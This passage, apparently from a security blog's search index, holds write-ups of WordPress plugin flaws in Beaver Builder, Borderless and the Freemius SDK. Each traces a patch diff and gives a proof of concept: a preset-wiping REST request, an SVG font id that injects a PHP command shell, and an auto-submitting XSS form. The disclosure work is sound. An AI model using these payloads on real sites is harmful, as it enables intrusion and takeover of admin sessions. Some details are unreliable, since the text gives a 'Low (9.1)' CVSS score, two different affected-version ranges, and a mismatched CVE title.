C[\"REST API calls permission_callback = check_permission()\"] --\u003e D[\"check_permission() → current_user_can('builder_access')\"] --\u003e G[\"builder_access = true for Contributor\"] --\u003e H[\"Request is accepted\"] --\u003e I[\"set_color_presets / delete_color_presets / set_background_presets\"] --\u003e J[\"Global Presets are added / modified / deleted site-wide\"] graph TD A[\"Authenticated user (Contributor or higher)\"] --\u003e B[\"Sends request to /wp-json/fl-controls/v1/*\"] --\u003e C[\"REST API calls permission_callback = check_permission()\"] --\u003e D[\"check_permission() → current_user_can('builder_access')\"] --\u003e G[\"builder_access = true for Contributor\"] --\u003e H[\"Request is accepted\"] --\u003e I[\"set_color_presets / delete_color_presets / set_background_presets\"] --\u003e J[\"Global Presets are added / modified / deleted site-wide\"] ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Login with a Contributor account. Obtain nonce by pasting the following in the browser console: wpApiSettings.nonce Add the X-WP-Nonce header and send the request: POST /wp-json/fl-controls/v1/color_presets/ HTTP/1.1 Cookie: contributor_cookie X-WP-Nonce: 0db9546893 { \"clearPresets\": true } Repeat similarly for the other endpoints. ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-11726 is a Broken Access Control issue caused by the plugin only checking the internal builder_access permission — which by default applies to roles with edit_posts (i.e., Contributor and above). Therefore, merely logging in allows an attacker to add, modify, or delete Global Presets via the fl-controls/v1 REST API, affecting all Beaver Builder content site-wide. The patch in v2.9.4.1 fixes this by replacing check_permission with check_write_permission, requiring both builder_access and unrestricted_editing, and limiting it to Editor and Administrator roles. ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Authentication ≠ Authorization Avoid using default = all for sensitive permissions Custom permissions should map correctly to WordPress core capabilities Endpoints that modify global settings must require high privileges (Admin/Editor) Comparing (diff) vulnerable vs patched versions is a quick way to spot permission logic errors Multiple layers of permission checks are needed for critical actions ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress Beaver Builder Plugin \u003c= 2.9.4 is vulnerable to Broken Access Control ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Borderless Plugin.","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WordPress plugin The Borderless – Widgets, Elements, Templates and Toolkit for Elementor \u0026 Gutenberg contains a Remote Code Execution vulnerability in all versions up to and including 1.5.9 via the write_config function. The root cause is improper sanitization of an imported JSON file. This allows an authenticated attacker with Administrator-level access or higher to execute code on the server. CVE ID: CVE-2024-11600 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.6.0 Patched Versions: 1.6.1 CVSS severity: Low (9.1) Required Privilege: Administrator Product: WordPress Borderless Plugin ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Borderless: 1.6.0 – vulnerable 1.6.1 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v1.6.0): icon-manager.php v1.6.0 function write_config() { $charmap = $this-\u003epaths['tempdir'] . '/' . $this-\u003epaths['config']; $handle = @fopen( $charmap, 'w' ); if ( $handle ) { fwrite( $handle, '\u003c?php $icons = array();' ); // Safely build the PHP array with sanitized content foreach ( $this-\u003ejson_config[ $this-\u003eip_name ] as $icon =\u003e $info ) { if ( ! empty( $info ) ) { $delimiter = \"'\"; $safe_icon = esc_attr( $icon ); $safe_class = esc_attr( $info[\"class\"] ); $safe_tags = esc_attr( $info[\"tags\"] ); fwrite( $handle, \"\\r\\n\" . '$icons[\\'' . $this-\u003eip_name . '\\'][' . $delimiter . $safe_icon . $delimiter . '] = array(\"class\"=\u003e' . $delimiter . $safe_class . $delimiter . ',\"tags\"=\u003e' . $delimiter . $safe_tags . $delimiter . ');' ); } else { $this-\u003edelete_folder( $this-\u003epaths['tempdir'] ); die( esc_html__( 'Error generating the configuration file.', 'borderless' ) ); } } fclose( $handle ); } else { $this-\u003edelete_folder( $this-\u003epaths['tempdir'] ); die( esc_html__( 'Error generating the configuration file.', 'borderless' ) ); } } The write_config() function writes the icon configuration into a PHP file. Each icon is stored as: $icons['\u003cip_name\u003e']['\u003cicon_name\u003e'] = array(\"class\"=\u003e'\u003cclass\u003e',\"tags\"=\u003e'\u003ctags\u003e'); Before being written to the file, this value is taken from the id attribute of the \u003cfont\u003e tag in the SVG and passed through: icon-manager.php create_config() v1.6.0 $this-\u003eip_name = (string) $font_attr['id']; $this-\u003eip_name = sanitize_text_field( $this-\u003eip_name ); sanitize_text_field() only removes HTML tags, control characters, and excessive whitespace. It does not prevent dangerous special characters in a PHP context (such as ', ], ;). As a result, an attacker can inject a payload into the id attribute of the SVG: \u003cfont id=\"']; php_code;//\"\u003e The line written to the file then becomes: $icons['']; php_code;//']['\u003cicon_name\u003e'] = array(\"class\"=\u003e'\u003cclass\u003e',\"tags\"=\u003e'\u003ctags\u003e'); The patch (v1.6.1): index.php v1.6.1 $this-\u003eip_name = sanitize_file_name( $this-\u003eip_name ); if ( empty( $this-\u003eip_name ) ) { $this-\u003eip_name = 'unknown'; } The patch replaces sanitize_text_field() with sanitize_file_name(), which removes all dangerous special characters (', \", ;, |, .., whitespace, complex Unicode, etc.) and normalizes the string into a safe file/key name. This prevents payload injection that could break PHP syntax in the configuration file. Changes introduced by the patch ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a submenu: dashboard.php v1.6.0 function borderless_icon_fonts_submenu() { $icon_manager_page = add_submenu_page( 'borderless.php', esc_html__( \"Icon Fonts\", \"borderless\" ), esc_html__( \"Icon Fonts\", \"borderless\" ), 'manage_options', 'borderless-fonts', 'borderless_custom_icons_menu' ); $Borderless_IF = new Borderless_IF; add_action('admin_print_styles-' . $icon_manager_page, array( $Borderless_IF, 'admin_scripts' ) ); } 'Icon Fonts': submenu title 'manage_options': this menu is for Administrators only 'borderless-fonts': menu slug Corresponding in the Admin Dashboard: Menu in the Admin Dashboard 'borderless_custom_icons_menu': callback executed when accessing the menu icon-manager.php v1.6.0 function borderless_custom_icons_menu() { $Borderless_IF = new Borderless_IF; $Borderless_IF-\u003eicon_pack_manager(); } Here, a Borderless_IF object is instantiated: icon-manager.php v1.6.0 class Borderless_IF { function __construct() { $this-\u003epaths = wp_upload_dir(); $this-\u003epaths['fonts'] = 'borderless_icon_fonts'; $this-\u003epaths['temp'] = trailingslashit( $this-\u003epaths['fonts'] ) . 'borderless_temp'; $this-\u003epaths['fontdir'] = trailingslashit( $this-\u003epaths['basedir'] ) . $this-\u003epaths['fonts']; $this-\u003epaths['tempdir'] = trailingslashit( $this-\u003epaths['basedir'] ) . $this-\u003epaths['temp']; $this-\u003epaths['fonturl'] = set_url_scheme( trailingslashit( $this-\u003epaths['baseurl'] ) . $this-\u003epaths['fonts'] ); $this-\u003epaths['tempurl'] = trailingslashit( $this-\u003epaths['baseurl'] ) . trailingslashit( $this-\u003epaths['temp'] ); $this-\u003epaths['config'] = 'charmap.php'; add_action( 'wp_ajax_borderless_ajax_add_zipped_font', array( $this, 'add_zipped_font' ) ); add_action( 'wp_ajax_borderless_ajax_remove_zipped_font', array( $this, 'remove_zipped_font' ) ); } ... } The constructor initializes the necessary paths and hooks. The write_config() function uses these paths to build the configuration file path: $charmap = $this-\u003epaths['tempdir'] . '/' . $this-\u003epaths['config']; // \u003cbase_url\u003e/wp-content/uploads/borderless_icon_fonts/borderless_temp/charmap.php The AJAX action wp_ajax_borderless_ajax_add_zipped_font is registered to handle uploading and adding fonts from a ZIP file, with add_zipped_font as the callback that performs extraction and writes the configuration file. icon-manager.php v1.6.0 function add_zipped_font() { $cap = apply_filters( 'avf_file_upload_capability', 'update_plugins' ); if ( ! current_user_can( $cap ) ) { die( esc_html__( \"You do not have sufficient permissions to use this feature.\", \"borderless\" ) ); } // Retrieve the file path of the zip file $attachment = $_POST['values']; $path = realpath( get_attached_file( sanitize_text_field( $attachment['id'] ) ) ); $unzipped = $this-\u003ezip_flatten( $path, array( '\\.eot', '\\.svg', '\\.ttf', '\\.woff', '\\.json', '\\.css' ) ); // If we managed to unzip the file and save it, extract the SVG file if ( $unzipped ) { $this-\u003ecreate_config(); } // If we did not get a name for the font, do not add it and remove the temp folder if ( $this-\u003eip_name == 'unknown' ) { $this-\u003edelete_folder( $this-\u003epaths['tempdir'] ); die( esc_html__( 'Unable to retrieve the Icon Pack name from your uploaded folder.', 'borderless' ) ); } die( esc_html__( 'borderless_font_added:', 'borderless' ) . $this-\u003eip_name ); } In add_zipped_font(), after the user uploads a ZIP file containing the Icon Pack, the plugin performs these steps: Checks for the update_plugins capability → Administrator only Unzips and keeps only the necessary files for the Icon Pack: fonts (.eot, .svg, .ttf, .woff), JSON, CSS Calls create_config() to generate the configuration file icon-manager.php v1.6.0 function create_config() { $this-\u003ejson_file = $this-\u003efind_json(); $this-\u003esvg_file = $this-\u003efind_svg(); if ( empty( $this-\u003ejson_file ) || empty( $this-\u003esvg_file ) ) { $this-\u003edelete_folder( $this-\u003epaths['tempdir'] ); die( esc_html__( 'SVG file or selection.json not found. Please check the integrity of the Icon Pack files.', 'borderless' ) ); } // Attem","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Attacker with Administrator privilege\"] --\u003e B[\"Uploads a ZIP file containing an Icon Pack (SVG + JSON)\"] B --\u003e C[\"AJAX call: borderless_ajax_add_zipped_font\"] C --\u003e D[\"zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/\"] D --\u003e E[\"create_config() is executed\"] E --\u003e F[\"Reads the SVG file\"] F --\u003e G[\"Extracts font id=... as ip_name\"] G --\u003e H[\"sanitize_text_field(ip_name) (dangerous characters not removed)\"] E --\u003e I[\"Reads JSON file\"] I --\u003e J[\"Builds $this-\u003ejson_config array\"] H \u0026 J --\u003e K[\"write_config() writes data into charmap.php\"] K --\u003e L[\"Injected payload is embedded into PHP code\"] L --\u003e M[\"charmap.php now contains malicious PHP\"] M --\u003e N[\"Server loads/includes charmap.php\"] N --\u003e O[\"Remote Code Execution (RCE)\"] graph TD A[\"Attacker with Administrator privilege\"] --\u003e B[\"Uploads a ZIP file containing an Icon Pack (SVG + JSON)\"] B --\u003e C[\"AJAX call: borderless_ajax_add_zipped_font\"] C --\u003e D[\"zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/\"] D --\u003e E[\"create_config() is executed\"] E --\u003e F[\"Reads the SVG file\"] F --\u003e G[\"Extracts font id=... as ip_name\"] G --\u003e H[\"sanitize_text_field(ip_name) (dangerous characters not removed)\"] E --\u003e I[\"Reads JSON file\"] I --\u003e J[\"Builds $this-\u003ejson_config array\"] H \u0026 J --\u003e K[\"write_config() writes data into charmap.php\"] K --\u003e L[\"Injected payload is embedded into PHP code\"] L --\u003e M[\"charmap.php now contains malicious PHP\"] M --\u003e N[\"Server loads/includes charmap.php\"] N --\u003e O[\"Remote Code Execution (RCE)\"] graph TD A[\"Attacker with Administrator privilege\"] --\u003e B[\"Uploads a ZIP file containing an Icon Pack (SVG + JSON)\"] B --\u003e C[\"AJAX call: borderless_ajax_add_zipped_font\"] C --\u003e D[\"zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/\"] D --\u003e E[\"create_config() is executed\"] E --\u003e F[\"Reads the SVG file\"] F --\u003e G[\"Extracts font id=... as ip_name\"] G --\u003e H[\"sanitize_text_field(ip_name) (dangerous characters not removed)\"] E --\u003e I[\"Reads JSON file\"] I --\u003e J[\"Builds $this-\u003ejson_config array\"] H \u0026 J --\u003e K[\"write_config() writes data into charmap.php\"] K --\u003e L[\"Injected payload is embedded into PHP code\"] L --\u003e M[\"charmap.php now contains malicious PHP\"] M --\u003e N[\"Server loads/includes charmap.php\"] N --\u003e O[\"Remote Code Execution (RCE)\"] graph TD A[\"Attacker with Administrator privilege\"] --\u003e B[\"Uploads a ZIP file containing an Icon Pack (SVG + JSON)\"] B --\u003e C[\"AJAX call: borderless_ajax_add_zipped_font\"] C --\u003e D[\"zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/\"] D --\u003e E[\"create_config() is executed\"] E --\u003e F[\"Reads the SVG file\"] F --\u003e G[\"Extracts font id=... as ip_name\"] G --\u003e H[\"sanitize_text_field(ip_name) (dangerous characters not removed)\"] E --\u003e I[\"Reads JSON file\"] I --\u003e J[\"Builds $this-\u003ejson_config array\"] H \u0026 J --\u003e K[\"write_config() writes data into charmap.php\"] K --\u003e L[\"Injected payload is embedded into PHP code\"] L --\u003e M[\"charmap.php now contains malicious PHP\"] M --\u003e N[\"Server loads/includes charmap.php\"] N --\u003e O[\"Remote Code Execution (RCE)\"] ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a ZIP file containing rce.json and rce.svg: rce.svg \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cdefs\u003e \u003cfont id=\"'];system($_REQUEST['cmd']);//\" horiz-adv-x=\"1024\"\u003e \u003cfont-face font-family=\"icomoon\" units-per-em=\"1024\" ascent=\"960\" descent=\"-64\"/\u003e \u003cglyph unicode=\"\u0026#xe900;\" glyph-name=\"home\" d=\"M512 128L128 512h128v320h192V640h128v192h192V512h128z\"/\u003e \u003c/font\u003e \u003c/defs\u003e \u003c/svg\u003e Using an Administrator account, upload the ZIP file at the endpoint: http://localhost/wp-admin/admin.php?page=borderless-fonts Uploaded file RCE result: Result ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2024-11600 demonstrates that using the wrong sanitization function can lead to Remote Code Execution. Borderless (≤ 1.6.0) directly takes the \u003cfont id\u003e value from the SVG, sanitizes it only with sanitize_text_field(), and writes it into a PHP file (charmap.php). An attacker with Administrator privileges can inject PHP code, which is executed when the file is loaded. Version 1.6.1 fixed this by using sanitize_file_name() and a fallback value. ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Always sanitize according to context (this data is written into PHP, not plain text). Do not use sanitize_text_field() for data written into executable source code. SVG/ZIP files can also be attack vectors. Automatically generating .php files must always be strictly controlled. ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress Borderless Plugin \u003c= 1.6.0 is vulnerable to Remote Code Execution (RCE) ","date":"2025-12-06","objectID":"/posts/2025-12-06-cve-2024-11600/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-11600 Analysis \u0026 POC","uri":"/posts/2025-12-06-cve-2024-11600/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in Freemius SDK.","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info Freemius SDK for WordPress does not properly sanitize input data or escape output data, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. This directly affects more than 1,000 plugins and themes using this SDK. CVE ID: CVE-2023-33999 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.5.9 Patched Versions: 2.5.10 CVSS severity: Medium (6.1) Required Privilege: Unauthenticated Product: Freemius SDK for WordPress ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - TablePress: 2.1.4 – vulnerable 2.1.5 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"About Freemius SDK Freemius SDK is a library (Software Development Kit) for WordPress, helping plugin and theme developers easily add the following features to their products: License management Handling freemium / premium versions Allowing users to connect accounts (opt-in) Collecting usage statistics (analytics) Managing payments and renewals Displaying upsell / upgrade in the WordPress dashboard Note Freemius SDK is not a standalone plugin; it is embedded directly into the source code of other plugins or themes. Therefore, when a vulnerability exists in Freemius SDK, many products are affected. The plugin TablePress is one of the impacted cases, so it was chosen for analysis. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#about-freemius-sdk"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version v2.5.9: freemius/includes/fs-core-functions.php v2.5.9 /** * A helper method to fetch GET/POST user input with an optional default value when the input is not set. * @author Vova Feldman (@svovaf) * * @param string $key * @param mixed $def * @param string|bool $type Since 1.2.1.7 - when set to 'get' will look for the value passed via querystring, when * set to 'post' will look for the value passed via the POST request's body, otherwise, * will check if the parameter was passed in any of the two. * * @return mixed */ function fs_request_get( $key, $def = false, $type = false ) { if ( is_string( $type ) ) { $type = strtolower( $type ); } /** * Note to WordPress.org Reviewers: * This is a helper method to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function's usage. */ switch ( $type ) { case 'post': $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def; break; case 'get': $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def; break; default: $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def; break; } return $value; } The fs_request_get() function is used to retrieve the value of a parameter from a user request (GET, POST, or both), based on the provided key name. If the parameter does not exist, the function returns the default value. The $type parameter allows explicitly specifying whether the data source is GET, POST, or all (REQUEST). Bug The returned data is not sanitized or escaped. If this value is printed to the browser (for example, using echo) without proper handling, an attacker can inject malicious JavaScript code through request parameters, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. Patch v2.5.9: freemius/includes/fs-core-functions.php v2.5.10 function fs_request_get_raw( $key, $def = false, $type = false ) { if ( is_string( $type ) ) { $type = strtolower( $type ); } /** * Note to WordPress.org reviewers: * This is a helper function to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function's usage. */ switch ( $type ) { case 'post': // phpcs:ignore WordPress.Security.NonceVerification.Missing $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def; break; case 'get': // phpcs:ignore WordPress.Security.NonceVerification.Recommended $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def; break; default: // phpcs:ignore WordPress.Security.NonceVerification.Recommended $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def; break; } // Don't unslash if the value itself is empty (empty string, null, empty array etc). return empty( $value ) ? $value : wp_unslash( $value ); } function fs_sanitize_input( $input ) { if ( is_array( $input ) ) { foreach ( $input as $key =\u003e $value ) { $input[ $key ] = fs_sanitize_input( $value ); } } else { // Allow empty values to pass through as-is, like `null`, `''`, `0`, `'0'` etc. $input = empty( $input ) ? $input : sanitize_text_field( $input ); } return $input; } function fs_request_get( $key, $def = false, $type = false ) { return fs_sanitize_input( fs_request_get_raw( $key, $def, $type ) ); } The patch separates data retrieval and data sanitization into two distinct steps. fs_request_get_raw() only retrieves the raw value from GET/POST/REQUEST and removes escaping with wp_unslash(), while fs_sanitize_input() is responsible for sanitizing (even when the input is an array) using sanitize_text_field(). Finally, fs_request_get() always returns sanitized data. As a result, malicious data is no longer returned directly, reducing the risk of Reflected XSS exploitation. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The fs_request_get() function is called in many places. 127 references so the tracing process is somewhat time-consuming. Locations where fs_request_get is called The dynamic_init() function calls fs_request_get() to retrieve the values of keys such as purchased_plan and purchase_email from the request, and then uses these values to display a license purchase confirmation message in the admin page. These values are not sanitized before being included in the displayed content, leading to the risk that user-controlled data can inject malicious code and cause a Reflected Cross-Site Scripting (XSS) vulnerability. For this message to appear, 3 conditions must be met: The request must be called from the Admin Dashboard $this-\u003eis_user_in_admin() /** * Check if a real user is visiting the admin dashboard. * * @author Vova Feldman (@svovaf) * @since 1.1.7 * * @return bool */ function is_user_in_admin() { return ( is_admin() \u0026\u0026 ! self::is_ajax() \u0026\u0026 ! self::is_cron() \u0026\u0026 ! self::is_admin_post() ); } Check whether the user has already connected (opted-in) to Freemius. $this-\u003eis_registered() /** * Check if user has connected his account (opted-in). * * Note: * If the user opted-in and opted-out on a later stage, * this will still return true. If you want to check if the * user is currently opted-in, use: * `$fs-\u003eis_registered() \u0026\u0026 $fs-\u003eis_tracking_allowed()` * * @author Vova Feldman (@svovaf) * @since 1.0.1 * * @param bool $ignore_anonymous_state Since 2.5.1 * * @return bool */ function is_registered( $ignore_anonymous_state = false ) { return ( is_object( value: $this-\u003e_user ) \u0026\u0026 ( $this-\u003eis_premium() || $ignore_anonymous_state || ! $this-\u003eis_anonymous() ) ); } After successfully setting up the plugin, the system sends a confirmation email to complete this connection (opt-in) process. Connect to Freemius The request must contain the purchase_completed parameter fs_request_has( 'purchase_completed' ) function fs_request_has( $key ) { return isset( $_REQUEST[ $key ] ); } dynamic_init() is called inside the fs_dynamic_init() function function fs_dynamic_init( $module ) { $fs = Freemius::instance( $module['id'], $module['slug'], true ); $fs-\u003edynamic_init( $module ); return $fs; } This function creates an instance of Freemius and calls dynamic_init() to initialize the SDK with the configuration from $module. fs_dynamic_init() is called in the file tablepress/tablepress.php (the tb_tp_fs() function) tablepress/tablepress.php function tb_tp_fs() { global $tb_tp_fs; if ( ! isset( $tb_tp_fs ) ) { // Include Freemius SDK. require_once __DIR__ . '/libraries/freemius/start.php'; $tb_tp_fs = fs_dynamic_init( array( 'id' =\u003e '10340', 'slug' =\u003e 'tablepress', 'type' =\u003e 'plugin', 'public_key' =\u003e 'pk_b215ca1bb4041cf43ed137ae7665b', 'is_premium' =\u003e false, 'has_addons' =\u003e false, 'has_paid_plans' =\u003e true, 'menu' =\u003e array( 'slug' =\u003e 'tablepress', 'contact' =\u003e false, 'support' =\u003e false, 'account' =\u003e false, 'pricing' =\u003e false, ), 'opt_in_moderation' =\u003e array( 'new' =\u003e true, 'updates' =\u003e false, 'localhost' =\u003e false, ), 'is_live' =\u003e true, ) ); } return $tb_tp_fs; } This function: Loads the Freemius SDK Calls fs_dynamic_init() with the configuration for TablePress Stores the instance in the global variable $tb_tp_fs tb_tp_fs() is called directly in tablepress/tablepress.php tablepress/tablepress.php // Init Freemius. tb_tp_fs(); Because tablepress.php is the first file loaded by WordPress when the plugin runs, the Freemius SDK is also initialized from here. Therefore, the flow tablepress/tablepress.php → tb_tp_fs() → fs_dynamic_init() → dynamic_init() is always executed whenever WordPress processes a request and the TablePress plugin is loaded. This means that the logic inside dynamic_init(), including reading data from the request (such as purchased_plan, purchase_email…), will always have a chance to be triggered when users access endpoints related to the admin area. Triggering the vulnerability However, in order for the vulnerability to be exploited with ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"PoC Create a malicious website that automatically sends a request to the WordPress admin page: \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/index.php\"\u003e \u003cinput type=\"hidden\" name=\"purchase\u0026#95;email\" value=\"\u0026lt;svg\u0026#47;onload\u0026#61;alert\u0026#40;\u0026#41;\u0026gt;\" /\u003e \u003cinput type=\"submit\" value=\"Submit request\" /\u003e \u003c/form\u003e \u003cscript\u003e history.pushState('', '', '/'); document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Send the link of this website to a user with administrator privileges and trick them into visiting it, thereby triggering the request when the malicious page is loaded. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2023-33999 originates from unsanitized input handling in fs_request_get() of the Freemius SDK, allowing user-controlled data to be directly injected into content displayed in the admin page. Because Freemius is widely embedded in many plugins and themes, the impact of this vulnerability is much greater than that of a single plugin. Version 2.5.10 fixes the issue by separating data retrieval and sanitization, ensuring that all data from requests is sanitized before being used. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:7:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never trust data from $_GET, $_POST, $_REQUEST – always sanitize and escape before using or displaying it. A vulnerability in a shared SDK (such as Freemius) creates a chain reaction affecting thousands of products. Always check third-party libraries and update to patched versions in a timely manner. Early SDK initialization increases the chance that a vulnerability can be triggered on more requests than expected. Reflected XSS can be exploited indirectly through social engineering and malicious websites. ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:8:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross Site Scripting https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01 ","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2023-33999/:9:0","tags":["analyst","plugin","xss"],"title":"CVE-2023-33999 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2023-33999/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MetalpriceAPI Plugin.","date":"2025-12-05","objectID":"/posts/2025-12-05-cve-2025-48140/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2024-8672 Analysis \u0026 POC","uri":"/posts/2025-12-05-cve-2025-48140/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info 